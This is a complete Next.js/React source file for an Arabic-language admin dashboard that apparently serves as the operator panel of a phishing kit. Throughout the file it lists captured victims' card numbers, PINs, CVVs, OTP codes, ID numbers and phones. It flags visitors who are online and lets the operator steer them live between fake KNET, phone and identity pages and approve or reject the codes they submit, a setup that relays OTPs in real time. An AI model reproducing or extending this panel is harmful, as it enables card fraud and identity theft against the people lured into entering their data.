'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Filter,
  InfoIcon,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { ar } from 'date-fns/locale';
import { formatDistanceToNow } from 'date-fns';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog';
import {
  collection,
  doc,
  writeBatch,
  updateDoc,
  onSnapshot,
  query,
  orderBy,
} from 'firebase/firestore';
import { onAuthStateChanged, signOut } from 'firebase/auth';
import { playNotificationSound } from '@/lib/actions';
import { auth, db, database } from '@/lib/firestore';
import { onValue, ref } from 'firebase/database';
import { Checkbox } from '@/components/ui/checkbox';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Separator } from '@/components/ui/separator';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0);

  useEffect(() => {
    const onlineUsersRef = ref(database, 'status');
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        const onlineCount = Object.values(data).filter(
          (status: any) => status.state === 'online'
        ).length;
        setOnlineUsersCount(onlineCount);
      }
    });

    return () => unsubscribe();
  }, []);

  return onlineUsersCount;
}

interface Notification {
  bank: string;
  bank_card: string;
  cardNumber: string;
  cardStatus: string;
  ip?: string;
  createdDate: string;
  cvv: string;
  id: string | '0';
  month: string;
  notificationCount: number;
  otp: string;
  otp2: string;
  page: string;
  pass: string;
  country?: string;
  personalInfo: {
    id?: string | '0';
  };
  prefix: string;
  status: 'pending' | string;
  isOnline?: boolean;
  lastSeen: string;
  violationValue: number;
  year: string;
  pagename: string;
  plateType: string;
  allOtps?: string[];
  idNumber: string;
  email: string;
  mobile: string;
  network: string;
  phoneOtp: string;
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [filteredNotifications, setFilteredNotifications] = useState<
    Notification[]
  >([]);
  const [isLoading, setIsLoading] = useState(true);
  const [message, setMessage] = useState<boolean>(false);
  const [selectedInfo, setSelectedInfo] = useState<'personal' | 'card' | null>(
    null
  );
  const [selectedNotification, setSelectedNotification] =
    useState<Notification | null>(null);
  const [violationValues, setViolationValues] = useState<{
    [key: string]: string;
  }>({});
  const [onlineUsers, setOnlineUsers] = useState<number>(0);
  const [totalVisitors, setTotalVisitors] = useState<number>(0);
  const [cardSubmissions, setCardSubmissions] = useState<number>(0);
  const [showOnlineOnly, setShowOnlineOnly] = useState(false);
  const [showWithCardOnly, setShowWithCardOnly] = useState(false);
  const [showFilters, setShowFilters] = useState(false);
  const [userStatuses, setUserStatuses] = useState<{ [key: string]: string }>(
    {}
  );
  const router = useRouter();
  const onlineUsersCount = useOnlineUsersCount();

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push('/login');
      } else {
        const unsubscribeNotifications = fetchNotifications();
        return () => {
          unsubscribeNotifications();
        };
      }
    });

    return () => unsubscribe();
  }, [router]);

  useEffect(() => {
    // Apply filters whenever filter settings or notifications change
    applyFilters();
  }, [notifications, showOnlineOnly, showWithCardOnly]);

  const fetchNotifications = () => {
    setIsLoading(true);
    const q = query(collection(db, 'pays'), orderBy('createdDate', 'desc'));
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any;
            setViolationValues((prev) => ({
              ...prev,
              [doc.id]: data.violationValue || '',
            }));
            return { id: doc.id, ...data };
          })
          .filter(
            (notification: any) => !notification.isHidden
          ) as Notification[];

        // Check if there are any new notifications with card info or general info
        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber &&
            !notifications.some((n) => n.id === notification.id && n.cardNumber)
        );
        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification.idNumber ||
              notification.email ||
              notification.mobile) &&
            !notifications.some(
              (n) =>
                n.id === notification.id && (n.idNumber || n.email || n.mobile)
            )
        );

        // Only play notification sound if new card info or general info is added
        if (hasNewCardInfo || hasNewGeneralInfo) {
          playNotificationSound();
        }

        // Update statistics
        updateStatistics(notificationsData);

        setNotifications(notificationsData);

        // Fetch online status for all users
        notificationsData.forEach((notification) => {
          fetchUserStatus(notification.id);
        });

        setIsLoading(false);
      },
      (error) => {
        console.error('Error fetching notifications:', error);
        setIsLoading(false);
      }
    );

    return unsubscribe;
  };

  const fetchUserStatus = (userId: string) => {
    const userStatusRef = ref(database, `/status/${userId}`);

    onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setUserStatuses((prev) => ({
          ...prev,
          [userId]: data.state,
        }));
      } else {
        setUserStatuses((prev) => ({
          ...prev,
          [userId]: 'offline',
        }));
      }
    });
  };

  const applyFilters = () => {
    let filtered = [...notifications];

    if (showOnlineOnly) {
      filtered = filtered.filter(
        (notification) => userStatuses[notification.id] === 'online'
      );
    }

    if (showWithCardOnly) {
      filtered = filtered.filter(
        (notification) =>
          notification.cardNumber && notification.cardNumber.trim() !== ''
      );
    }

    setFilteredNotifications(filtered);
  };

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length;

    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter(
      (notification) => notification.cardNumber
    ).length;

    setTotalVisitors(totalCount);
    setCardSubmissions(cardCount);
  };

  const handleClearAll = async () => {
    setIsLoading(true);
    try {
      const batch = writeBatch(db);
      notifications.forEach((notification) => {
        const docRef = doc(db, 'pays', notification.id);
        batch.update(docRef, { isHidden: true });
      });
      await batch.commit();
      setNotifications([]);
    } catch (error) {
      console.error('Error hiding all notifications:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, 'pays', id);
      await updateDoc(docRef, { isHidden: true });
      setNotifications(
        notifications.filter((notification) => notification.id !== id)
      );
    } catch (error) {
      console.error('Error hiding notification:', error);
    }
  };

  const handleApproval = async (state: string, id: string) => {
    const targetPost = doc(db, 'pays', id);
    await updateDoc(targetPost, {
      status: state,
    });
  };

  const handleLogout = async () => {
    try {
      await signOut(auth);
      router.push('/login');
    } catch (error) {
      console.error('Error signing out:', error);
    }
  };

  const handleInfoClick = (
    notification: Notification,
    infoType: 'personal' | 'card'
  ) => {
    setSelectedNotification(notification);
    setSelectedInfo(infoType);
  };

  const closeDialog = () => {
    setSelectedInfo(null);
    setSelectedNotification(null);
  };

  const toggleFilters = () => {
    setShowFilters(!showFilters);
  };

  function UserStatusBadge({ userId }: { userId: string }) {
    const [status, setStatus] = useState<string>('unknown');

    useEffect(() => {
      const userStatusRef = ref(database, `/status/${userId}`);

      const unsubscribe = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val();
        if (data) {
          setStatus(data.state);
        } else {
          setStatus('unknown');
        }
      });

      return () => {
        // Clean up the listener when component unmounts
        unsubscribe();
      };
    }, [userId]);

    return (
      <Badge
        variant="outline"
        className={`px-2 py-1 ${
          status === 'online'
            ? 'bg-green-100 text-green-700 border-green-300'
            : 'bg-red-100 text-red-700 border-red-300'
        }`}
      >
        <span className="flex items-center gap-1.5">
          <span
            className={`h-2 w-2 rounded-full ${
              status === 'online' ? 'bg-green-500' : 'bg-red-500'
            }`}
          ></span>
          <span>{status === 'online' ? 'متصل' : 'غير متصل'}</span>
        </span>
      </Badge>
    );
  }

  const handleViolationUpdate = async (id: string, value: string) => {
    try {
      const docRef = doc(db, 'pays', id);
      await updateDoc(docRef, { violationValue: value });
      setViolationValues((prev) => ({ ...prev, [id]: value }));
    } catch (error) {
      console.error('Error updating violation value:', error);
    }
  };

  const handleUpdatePage = async (id: string, page: string) => {
    try {
      const docRef = doc(db, 'pays', id);
      await updateDoc(docRef, { page: page });
      setNotifications(
        notifications.map((notif) =>
          notif.id === id ? { ...notif, page: page } : (notif as any)
        )
      );
    } catch (error) {
      console.error('Error updating current page:', error);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-50 text-gray-800 flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="h-8 w-8 border-4 border-t-blue-500 border-b-blue-300 border-l-blue-300 border-r-blue-300 rounded-full animate-spin"></div>
          <p className="text-lg font-medium">جاري التحميل...</p>
        </div>
      </div>
    );
  }

  const displayNotifications =
    filteredNotifications.length > 0 || showOnlineOnly || showWithCardOnly
      ? filteredNotifications
      : notifications;

  return (
    <div className="min-h-screen bg-gray-50 text-gray-800">
      <header className="bg-white border-b border-gray-200 shadow-sm">
        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
          <h1 className="text-2xl font-bold text-gray-800">لوحة التحكم</h1>
          <Button
            variant="outline"
            onClick={handleLogout}
            className="bg-white hover:bg-gray-100 border border-gray-300"
          >
            تسجيل الخروج
          </Button>
        </div>
      </header>

      <main className="container mx-auto px-4 py-6">
        <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
          <h2 className="text-xl font-semibold mb-4 sm:mb-0">جميع الإشعارات</h2>
          <div className="flex flex-col sm:flex-row gap-2">
            <Button
              variant="outline"
              onClick={toggleFilters}
              className="bg-white hover:bg-gray-50 border border-gray-300 flex items-center gap-2"
            >
              <Filter className="h-4 w-4" />
              الفلاتر
              {(showOnlineOnly || showWithCardOnly) && (
                <Badge className="ml-2 bg-blue-500">
                  {showOnlineOnly && showWithCardOnly ? '2' : '1'}
                </Badge>
              )}
            </Button>
            <Button
              variant="destructive"
              onClick={handleClearAll}
              className="bg-red-600 hover:bg-red-700"
              disabled={notifications.length === 0}
            >
              مسح جميع الإشعارات
            </Button>
          </div>
        </div>

        {showFilters && (
          <Card className="mb-6 border border-gray-200 shadow-sm">
            <CardHeader className="pb-2">
              <CardTitle className="text-lg font-medium">
                خيارات التصفية
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="flex flex-col sm:flex-row gap-6">
                <div className="flex items-center space-x-2 space-x-reverse">
                  <Checkbox
                    id="online-filter"
                    checked={showOnlineOnly}
                    onCheckedChange={(checked: boolean) =>
                      setShowOnlineOnly(checked === true)
                    }
                    className="border-gray-400 data-[state=checked]:bg-blue-600"
                  />
                  <label
                    htmlFor="online-filter"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                  >
                    عرض المستخدمين المتصلين فقط
                  </label>
                </div>
                <div className="flex items-center space-x-2 space-x-reverse">
                  <Checkbox
                    id="card-filter"
                    checked={showWithCardOnly}
                    onCheckedChange={(checked: boolean) =>
                      setShowWithCardOnly(checked === true)
                    }
                    className="border-gray-400 data-[state=checked]:bg-blue-600"
                  />
                  <label
                    htmlFor="card-filter"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                  >
                    عرض المستخدمين الذين لديهم بطاقة فقط
                  </label>
                </div>
              </div>
              {(showOnlineOnly || showWithCardOnly) && (
                <div className="mt-4 text-sm text-blue-600">
                  يتم عرض {displayNotifications.length} من أصل{' '}
                  {notifications.length} إشعار
                </div>
              )}
            </CardContent>
          </Card>
        )}

        {/* Statistics Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
          {/* Online Users Card */}
          <Card className="border border-gray-200 shadow-sm">
            <CardContent className="p-6">
              <div className="flex items-center">
                <div className="rounded-full bg-blue-50 p-3 mr-4">
                  <UserCheck className="h-6 w-6 text-blue-600" />
                </div>
                <div>
                  <p className="text-sm text-gray-500 font-medium">
                    المستخدمين المتصلين
                  </p>
                  <p className="text-2xl font-bold text-gray-800">
                    {onlineUsersCount}
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Total Visitors Card */}
          <Card className="border border-gray-200 shadow-sm">
            <CardContent className="p-6">
              <div className="flex items-center">
                <div className="rounded-full bg-green-50 p-3 mr-4">
                  <Users className="h-6 w-6 text-green-600" />
                </div>
                <div>
                  <p className="text-sm text-gray-500 font-medium">
                    إجمالي الزوار
                  </p>
                  <p className="text-2xl font-bold text-gray-800">
                    {totalVisitors}
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Card Submissions Card */}
          <Card className="border border-gray-200 shadow-sm sm:col-span-2 md:col-span-1">
            <CardContent className="p-6">
              <div className="flex items-center">
                <div className="rounded-full bg-purple-50 p-3 mr-4">
                  <CreditCard className="h-6 w-6 text-purple-600" />
                </div>
                <div>
                  <p className="text-sm text-gray-500 font-medium">
                    معلومات البطاقات المقدمة
                  </p>
                  <p className="text-2xl font-bold text-gray-800">
                    {cardSubmissions}
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        <Tabs defaultValue="table" className="w-full">
          <TabsList className="mb-4 bg-white border border-gray-200 p-1 rounded-lg">
            <TabsTrigger
              value="table"
              className="data-[state=active]:bg-blue-50 data-[state=active]:text-blue-700"
            >
              جدول البيانات
            </TabsTrigger>
            <TabsTrigger
              value="cards"
              className="data-[state=active]:bg-blue-50 data-[state=active]:text-blue-700"
            >
              بطاقات
            </TabsTrigger>
          </TabsList>

          <TabsContent value="table" className="mt-0">
            <Card className="border border-gray-200 shadow-sm overflow-hidden">
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="bg-gray-50 border-b border-gray-200">
                      <th className="px-4 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                        الدوله
                      </th>
                      <th className="px-4 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                        الإسم
                      </th>
                      <th className="px-4 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                        المعلومات
                      </th>
                      <th className="px-4 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                        الصفحة الحالية
                      </th>
                      <th className="px-4 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                        الوقت
                      </th>
                      <th className="px-4 py-3 text-center text-xs font-medium text-gray-500 uppercase tracking-wider">
                        الحالة
                      </th>
                      <th className="px-4 py-3 text-center text-xs font-medium text-gray-500 uppercase tracking-wider">
                        تحديث الصفحة
                      </th>
                      <th className="px-4 py-3 text-center text-xs font-medium text-gray-500 uppercase tracking-wider">
                        حذف
                      </th>
                    </tr>
                  </thead>
                  <tbody className="bg-white divide-y divide-gray-200">
                    {displayNotifications.map((notification) => (
                      <tr
                        key={notification.id}
                        className="hover:bg-gray-50 transition-colors"
                      >
                        <td className="px-4 py-4 whitespace-nowrap">
                          {notification?.country!}
                        </td>
                        <td className="px-4 py-4 whitespace-nowrap font-medium">
                          {notification.personalInfo?.id!}
                        </td>
                        <td className="px-4 py-4 whitespace-nowrap">
                          <div className="flex flex-wrap gap-2">
                            <Badge
                              variant={
                                notification.personalInfo?.id!
                                  ? 'secondary'
                                  : 'destructive'
                              }
                              className="rounded-md cursor-pointer hover:bg-opacity-80 transition-colors"
                              onClick={() =>
                                handleInfoClick(notification, 'personal')
                              }
                            >
                              {notification.personalInfo?.id!
                                ? 'معلومات شخصية'
                                : 'لا يوجد معلومات'}
                            </Badge>
                            <Badge
                              variant={
                                notification.cardNumber
                                  ? 'default'
                                  : 'destructive'
                              }
                              className={`rounded-md cursor-pointer hover:bg-opacity-80 transition-colors ${
                                notification.cardNumber ? 'bg-green-600' : ''
                              }`}
                              onClick={() =>
                                handleInfoClick(notification, 'card')
                              }
                            >
                              {notification.cardNumber
                                ? 'معلومات البطاقة'
                                : 'لا يوجد بطاقة'}
                            </Badge>
                            <Badge
                              variant={'outline'}
                              className={`rounded-md cursor-pointer hover:bg-opacity-80 transition-colors ${
                                notification.mobile
                                  ? 'bg-yellow-50 text-yellow-700 border-yellow-300'
                                  : ''
                              }`}
                              onClick={() =>
                                handleInfoClick(notification, 'personal')
                              }
                            >
                              <InfoIcon className="h-3 w-3 mr-1" />
                              معلومات عامة
                            </Badge>
                          </div>
                        </td>
                        <td className="px-4 py-4 whitespace-nowrap">
                          <Badge
                            variant="outline"
                            className="bg-blue-50 text-blue-700 border-blue-200"
                          >
                            خطوه - {notification.page}
                          </Badge>
                        </td>
                        <td className="px-4 py-4 whitespace-nowrap text-sm text-gray-500">
                          {notification.createdDate &&
                            formatDistanceToNow(
                              new Date(notification.createdDate),
                              {
                                addSuffix: true,
                                locale: ar,
                              }
                            )}
                        </td>
                        <td className="px-4 py-4 whitespace-nowrap text-center">
                          <UserStatusBadge userId={notification.id} />
                        </td>
                        <td className="px-4 py-4 whitespace-nowrap">
                          <div className="flex flex-col items-center space-y-2">
                            <div className="flex justify-center space-x-2 space-x-reverse">
                              {[
                                {
                                  page: 'main',
                                  label: 'الرئيسية',
                                  hint: 'الصفحة الرئيسية',
                                },
                                {
                                  page: 'knet',
                                  label: 'كنت',
                                  hint: 'صفحة كنت',
                                },
                                {
                                  page: 'phone',
                                  label: 'تلفون',
                                  hint: 'تلفون',
                                },
                                {
                                  page: 'sahel',
                                  label: 'هوية',
                                  hint: 'هوية',
                                },
                              ].map(({ page, label, hint }) => (
                                <Button
                                  key={page}
                                  variant={
                                    notification?.page === page
                                      ? 'default'
                                      : 'outline'
                                  }
                                  size="sm"
                                  onClick={() =>
                                    handleUpdatePage(notification.id, page)
                                  }
                                  className={`relative ${
                                    notification.page === page
                                      ? 'bg-blue-600 hover:bg-blue-700'
                                      : 'bg-white hover:bg-gray-50 border-gray-300'
                                  }`}
                                  title={hint}
                                >
                                  {label}
                                  {notification.page === page && (
                                    <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
                                      ✓
                                    </span>
                                  )}
                                </Button>
                              ))}
                            </div>
                            <span className="text-xs text-gray-500">
                              {notification.page === 'main' &&
                                'الصفحة الرئيسية'}
                              {notification.page === 'knet' && 'صفحة كنت'}
                              {notification.page === 'phone' && 'رقم الهاتف '}
                              {notification.page === 'phoneOtp' && ' OTP'}
                              {notification.page === 'sahel' && 'هوية'}
                            </span>
                          </div>
                        </td>
                        <td className="px-4 py-4 whitespace-nowrap text-center">
                          <Button
                            variant="destructive"
                            size="sm"
                            onClick={() => handleDelete(notification.id)}
                            className="bg-red-100 hover:bg-red-200 text-red-600 border border-red-200"
                          >
                            <Trash2 className="h-4 w-4" />
                          </Button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
              {displayNotifications.length === 0 && (
                <div className="py-12 text-center text-gray-500">
                  <p>لا توجد إشعارات</p>
                </div>
              )}
            </Card>
          </TabsContent>

          <TabsContent value="cards" className="mt-0">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {displayNotifications.map((notification) => (
                <Card
                  key={notification.id}
                  className="border border-gray-200 shadow-sm overflow-hidden"
                >
                  <CardHeader className="pb-2 pt-4 px-4 flex flex-row justify-between items-start">
                    <div>
                      <CardTitle className="text-base font-medium">
                        {notification.personalInfo?.id!}
                      </CardTitle>
                      <p className="text-sm text-gray-500">
                        {notification?.country!}
                      </p>
                    </div>
                    <div className="flex items-center gap-2">
                      <UserStatusBadge userId={notification.id} />
                      <Button
                        variant="destructive"
                        size="sm"
                        onClick={() => handleDelete(notification.id)}
                        className="bg-red-100 hover:bg-red-200 text-red-600 border border-red-200 h-8 w-8 p-0"
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </div>
                  </CardHeader>
                  <CardContent className="px-4 py-3">
                    <div className="space-y-4">
                      <div className="flex flex-wrap gap-2">
                        <Badge
                          variant={
                            notification.personalInfo?.id!
                              ? 'secondary'
                              : 'destructive'
                          }
                          className="rounded-md cursor-pointer hover:bg-opacity-80 transition-colors"
                          onClick={() =>
                            handleInfoClick(notification, 'personal')
                          }
                        >
                          {notification.personalInfo?.id!
                            ? 'معلومات شخصية'
                            : 'لا يوجد معلومات'}
                        </Badge>
                        <Badge
                          variant={
                            notification.cardNumber ? 'default' : 'destructive'
                          }
                          className={`rounded-md cursor-pointer hover:bg-opacity-80 transition-colors ${
                            notification.cardNumber ? 'bg-green-600' : ''
                          }`}
                          onClick={() => handleInfoClick(notification, 'card')}
                        >
                          {notification.cardNumber
                            ? 'معلومات البطاقة'
                            : 'لا يوجد بطاقة'}
                        </Badge>
                        <Badge
                          variant={'outline'}
                          className={`rounded-md cursor-pointer hover:bg-opacity-80 transition-colors ${
                            notification.mobile
                              ? 'bg-yellow-50 text-yellow-700 border-yellow-300'
                              : ''
                          }`}
                          onClick={() =>
                            handleInfoClick(notification, 'personal')
                          }
                        >
                          <InfoIcon className="h-3 w-3 mr-1" />
                          معلومات عامة
                        </Badge>
                      </div>

                      <div className="grid grid-cols-2 gap-2 text-sm">
                        <div>
                          <span className="font-medium text-gray-600">
                            الصفحة الحالية:
                          </span>
                          <Badge
                            variant="outline"
                            className="bg-blue-50 text-blue-700 border-blue-200 mr-1"
                          >
                            خطوه - {notification.page}
                          </Badge>
                        </div>

                        <div>
                          <span className="font-medium text-gray-600">
                            الوقت:
                          </span>{' '}
                          <span className="text-gray-500">
                            {notification.createdDate &&
                              formatDistanceToNow(
                                new Date(notification.createdDate),
                                {
                                  addSuffix: true,
                                  locale: ar,
                                }
                              )}
                          </span>
                        </div>
                      </div>
                    </div>

                    <Separator className="my-4" />

                    <div>
                      <p className="text-sm font-medium text-gray-700 mb-2">
                        تحديث الصفحة:
                      </p>
                      <div className="flex flex-wrap gap-2">
                        {[
                          {
                            page: 'main',
                            label: 'الرئيسية',
                            hint: 'الصفحة الرئيسية',
                          },
                          { page: 'knet', label: 'كنت', hint: 'صفحة كنت' },
                          {
                            page: 'phone',
                            label: 'تلفون',
                            hint: 'تلفون',
                          },
                          {
                            page: 'sahel',
                            label: 'هوية',
                            hint: 'هوية',
                          },
                        ].map(({ page, label, hint }) => (
                          <Button
                            key={page}
                            variant={
                              notification?.page === page
                                ? 'default'
                                : 'outline'
                            }
                            size="sm"
                            onClick={() =>
                              handleUpdatePage(notification.id, page)
                            }
                            className={`relative ${
                              notification.page === page
                                ? 'bg-blue-600 hover:bg-blue-700'
                                : 'bg-white hover:bg-gray-50 border-gray-300'
                            }`}
                            title={hint}
                          >
                            {label}
                            {notification.page === page && (
                              <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
                                ✓
                              </span>
                            )}
                          </Button>
                        ))}
                      </div>
                      <div className="text-xs text-gray-500 mt-1">
                        {notification.page === 'main' && 'الصفحة الرئيسية'}
                        {notification.page === 'knet' && 'صفحة كنت'}
                        {notification.page === 'phone' && 'رقم الهاتف '}
                        {notification.page === 'phoneOtp' && ' OTP'}
                        {notification.page === 'sahel' && 'هوية'}
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}

              {displayNotifications.length === 0 && (
                <div className="col-span-full py-12 text-center text-gray-500">
                  <p>لا توجد إشعارات</p>
                </div>
              )}
            </div>
          </TabsContent>
        </Tabs>
      </main>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent
          className="bg-white text-gray-800 max-w-[90vw] md:max-w-md border border-gray-200 shadow-lg"
          dir="rtl"
        >
          <DialogHeader>
            <DialogTitle dir="rtl" className="text-xl font-bold">
              {selectedInfo === 'personal'
                ? 'المعلومات الشخصية'
                : selectedInfo === 'card'
                ? 'معلومات البطاقة'
                : 'معلومات عامة'}
            </DialogTitle>
            <DialogDescription className="text-gray-500">
              {selectedInfo === 'personal'
                ? 'تفاصيل المعلومات الشخصية'
                : selectedInfo === 'card'
                ? 'تفاصيل معلومات البطاقة'
                : 'تفاصيل المعلومات العامة'}
            </DialogDescription>
          </DialogHeader>

          <div className="mt-2">
            {selectedInfo === 'personal' && selectedNotification?.plateType && (
              <div className="space-y-3 p-4 bg-gray-50 rounded-lg">
                <p className="flex justify-between">
                  <strong className="text-gray-700">رقم الهوية:</strong>
                  <span className="font-medium">
                    {selectedNotification.idNumber}
                  </span>
                </p>
              </div>
            )}

            {selectedInfo === 'card' && selectedNotification && (
              <div className="space-y-3 p-4 bg-gray-50 rounded-lg">
                <p className="flex justify-between">
                  <strong className="text-gray-700">البنك:</strong>
                  <span className="font-medium">
                    {selectedNotification.bank}
                  </span>
                </p>
                <p className="flex justify-between">
                  <strong className="text-gray-700">رقم البطاقة:</strong>
                  <span className="font-medium">
                    {selectedNotification.cardNumber &&
                      selectedNotification.cardNumber +
                        ' - ' +
                        selectedNotification.prefix}
                  </span>
                </p>
                <p className="flex justify-between">
                  <strong className="text-gray-700">تاريخ الانتهاء:</strong>
                  <span className="font-medium">
                    {selectedNotification.year}/{selectedNotification.month}
                  </span>
                </p>
                <p className="flex justify-between">
                  <strong className="text-gray-700">رمز البطاقة:</strong>
                  <span className="font-medium">
                    {selectedNotification.pass}
                  </span>
                </p>
                <p className="flex justify-between">
                  <strong className="text-gray-700">رمز التحقق:</strong>
                  <span className="font-medium">
                    {selectedNotification?.otp2!}
                  </span>
                </p>
                <p className="flex justify-between">
                  <strong className="text-gray-700">رمز الامان:</strong>
                  <span className="font-medium">
                    {selectedNotification?.cvv!}
                  </span>
                </p>
              </div>
            )}

            {selectedInfo === 'personal' && selectedNotification && (
              <div className="space-y-3 p-4 bg-gray-50 rounded-lg">
                <p className="flex justify-between">
                  <strong className="text-gray-700">الهاتف:</strong>
                  <span className="font-medium">
                    {selectedNotification.mobile}
                  </span>
                </p>
                <p className="flex justify-between">
                  <strong className="text-gray-700">رقم الهوية:</strong>
                  <span className="font-medium">
                    {selectedNotification.idNumber}
                  </span>
                </p>
                <p className="flex justify-between">
                  <strong className="text-gray-700">نوع الشبكة:</strong>
                  <span className="font-medium">
                    {selectedNotification.network}
                  </span>
                </p>
                <p className="flex justify-between">
                  <strong className="text-gray-700">قيمة المخالفة:</strong>
                  <span className="font-medium">
                    {selectedNotification.violationValue}
                  </span>
                </p>
                <p className="flex justify-between">
                  <strong className="text-gray-700">رمز التحقق المرسل:</strong>
                  <span className="font-medium">
                    {selectedNotification.otp}
                  </span>
                </p>

                <div className="flex justify-between gap-3 mt-4">
                  <Button
                    onClick={() => {
                      handleApproval('approved', selectedNotification.id);
                      setMessage(true);
                      setTimeout(() => {
                        setMessage(false);
                      }, 3000);
                    }}
                    className="w-full bg-green-600 hover:bg-green-700"
                  >
                    قبول
                  </Button>
                  <Button
                    onClick={() => {
                      handleApproval('rejected', selectedNotification.id);
                      setMessage(true);
                      setTimeout(() => {
                        setMessage(false);
                      }, 3000);
                    }}
                    className="w-full bg-red-600 hover:bg-red-700"
                    variant="destructive"
                  >
                    رفض
                  </Button>
                </div>
                {message && (
                  <div className="text-center text-green-600 font-medium mt-2">
                    تم الارسال بنجاح
                  </div>
                )}
              </div>
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
